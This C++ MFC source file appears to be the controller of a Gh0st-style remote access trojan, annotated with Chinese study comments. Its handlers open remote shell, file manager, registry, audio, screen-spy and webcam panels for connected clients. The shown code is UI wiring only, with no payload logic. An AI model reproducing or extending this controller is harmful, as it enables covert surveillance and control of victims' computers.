void CRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{

	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); 
	while(pos) 
	{
		int	nItem = m_CList_Online.GetNextSelectedItem(pos);                          
		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); //从列表条目中取出ClientContext结构体
		
		
		// 发送获得驱动器列表数据包                                                 //查看ClientContext结构体
		m_iocpServer->Send(pContext, pData, nSize);      

		
	} 
}



LRESULT CRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);  //弹出对话框

	pContext->m_Dialog[0] = SHELL_DLG;       //消息Key
	pContext->m_Dialog[1] = (int)dlg;        //ShellDlg
	return 0;
}



LRESULT CRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());       //创建对话框
	dlg->ShowWindow(SW_SHOW);                          //显示对话框

	pContext->m_Dialog[0] = SYSTEM_DLG;                 //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}



LRESULT CRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*dlg = new CFileManagerDlg(this,m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());    //创建非阻塞的Dlg    Explorer.exe
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}



LRESULT CRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{


	ClientContext *pContext = (ClientContext *)lParam;
	CVideoDlg	*dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}



LRESULT CRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = REGEDIT_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}




LRESULT CRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = SERVER_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}